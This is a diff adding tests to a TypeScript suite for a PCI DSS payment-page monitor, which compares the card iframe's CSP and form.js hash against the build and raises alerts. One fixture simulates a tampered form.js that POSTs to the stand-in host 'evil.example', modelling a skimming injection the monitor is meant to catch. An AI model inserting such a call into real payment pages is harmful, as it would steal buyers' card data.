@@ -1,7 +1,7 @@
 // Monitor semanal das páginas de pagamento (PCI DSS 4.0 11.6.1): confere o cabeçalho CSP e o inventário de scripts de
 // /c e /o no próprio domínio e avisa o vendedor quando muda. Fetch falso, sem rede.
 import { createHash } from "node:crypto";
-import { afterAll, beforeAll, describe, expect, test } from "bun:test";
+import { afterAll, beforeAll, describe, expect, spyOn, test } from "bun:test";
 import { eq } from "drizzle-orm";
 import { cardFormCsp, cardFormHtml } from "@/card-service/page";
 import { alertText } from "@/lib/alerts";
@@ -100,6 +100,15 @@ describe("inspectCardFormPage (página do iframe do cartão)", () => {
     // A política antiga, que liberava a Cloudflare no iframe, também é diferente.
     const old = formPage().csp.replace("script-src 'self'", "script-src 'self' https://challenges.cloudflare.com");
     expect(inspectForm({ ...formPage(), csp: old }).problems).toContain("csp_diferente");
+  });
+
+  test("sha256 esperado (do build da mesma revisão): igual passa; diferente é inventario_mudou", () => {
+    const sha = "ab".repeat(32);
+    const base = { origins: ORIGINS, pageUrl: `${CARD}/form/${STORE}`, formJsSha256: sha };
+    expect(inspectCardFormPage(formPage().html, formPage().csp, { ...base, expectedFormJsSha256: sha }).problems).toEqual([]);
+    expect(inspectCardFormPage(formPage().html, formPage().csp, { ...base, expectedFormJsSha256: "cd".repeat(32) }).problems).toEqual(["inventario_mudou"]);
+    // Sem o arquivo do build (dev): só o histórico decide, como antes.
+    expect(inspectCardFormPage(formPage().html, formPage().csp, base).problems).toEqual([]);
   });
 
   test("aviso do painel e do e-mail dizem que é o formulário do cartão", () => {
@@ -241,5 +250,59 @@ describe("job pci_page_monitor", () => {
     await run({ html: "erro", csp: null, status: 502 });
     expect((await formRow())!.hash).toBe(changed!.hash);
     expect(await alerts()).toHaveLength(1);
+  });
+
+  test("CARD_ISOLATED: form.js diferente do build desta revisão avisa já na 1ª conferência e sai em log.error (sem valores)", async () => {
+    const shop = await seedShop();
+    const origins = await storeCheckoutOrigins(shop.storeId);
+    const page = { html: cardFormHtml({ storeId: shop.storeId, allowedOrigins: origins }), csp: cardFormCsp(origins) };
+    const checkout = { html: goodHtml(), csp: buyerCsp(NONCE, { dev: false, turnstile: false, cardOrigin: CARD }) };
+    const SERVED = "original();fetch('https://evil.example',{method:'POST'});";
+    const BUILT = createHash("sha256").update("original();").digest("hex");
+    const out: string[] = [];
+    const write = spyOn(process.stdout, "write").mockImplementation(((s: string) => void out.push(String(s))) as never);
+    try {
+      await createPciPageMonitorHandler({
+        fetch: fakeSite({ "/c/": checkout, "/form/": page, "/form.js": { html: SERVED, csp: null } }).fetchFn,
+        storeIds: [shop.storeId],
+        card: { origin: CARD },
+        expectedFormJsSha256: async () => BUILT,
+      })({} as never, new AbortController().signal);
+    } finally {
+      write.mockRestore();
+    }
+    const alerts = (await t.ownerDb.select().from(storeAlert).where(eq(storeAlert.storeId, shop.storeId))).map((a) => a.detail);
+    expect(alerts).toEqual([{ code: "inventario_mudou", page: "/form" }]);
+    const errors = out.map((l) => JSON.parse(l) as { level: string; msg: string; data?: Record<string, unknown> }).filter((r) => r.level === "error");
+    expect(errors).toHaveLength(1);
+    expect(errors[0]!.data).toEqual({ storeId: shop.storeId, page: "/form", problems: ["inventario_mudou"] });
+    expect(JSON.stringify(errors)).not.toContain(BUILT);
+  });
+
+  test("CARD_ISOLATED: qualquer mudança na conferência do /form (inclusive voltar ao normal) sai em log.error; /c não", async () => {
+    const shop = await seedShop();
+    const origins = await storeCheckoutOrigins(shop.storeId);
+    const page = { html: cardFormHtml({ storeId: shop.storeId, allowedOrigins: origins }), csp: cardFormCsp(origins) };
+    const checkoutCsp = buyerCsp(NONCE, { dev: false, turnstile: false, cardOrigin: CARD });
+    const run = async (formPageCsp: string, checkoutHtml: string) => {
+      const out: string[] = [];
+      const write = spyOn(process.stdout, "write").mockImplementation(((s: string) => void out.push(String(s))) as never);
+      try {
+        await createPciPageMonitorHandler({
+          fetch: fakeSite({ "/c/": { html: checkoutHtml, csp: checkoutCsp }, "/form/": { ...page, csp: formPageCsp }, "/form.js": { html: "x();", csp: null } }).fetchFn,
+          storeIds: [shop.storeId],
+          card: { origin: CARD },
+          expectedFormJsSha256: async () => null,
+        })({} as never, new AbortController().signal);
+      } finally {
+        write.mockRestore();
+      }
+      return out.map((l) => JSON.parse(l) as { level: string; data?: { page?: string } }).filter((r) => r.level === "error").map((r) => r.data?.page);
+    };
+    expect(await run(page.csp, goodHtml())).toEqual([]); // 1ª conferência ok: nada
+    expect(await run(page.csp.replace("script-src 'self'", "script-src *"), goodHtml())).toEqual(["/form"]);
+    expect(await run(page.csp, goodHtml())).toEqual(["/form"]); // voltou: também é mudança
+    // Checkout com script novo: aviso ao vendedor, sem log.error (não é a página do cartão).
+    expect(await run(page.csp, goodHtml(NONCE, `<script src="https://cdn.terceiro.example/x.js" nonce="${NONCE}"></script>`))).toEqual([]);
   });
 });
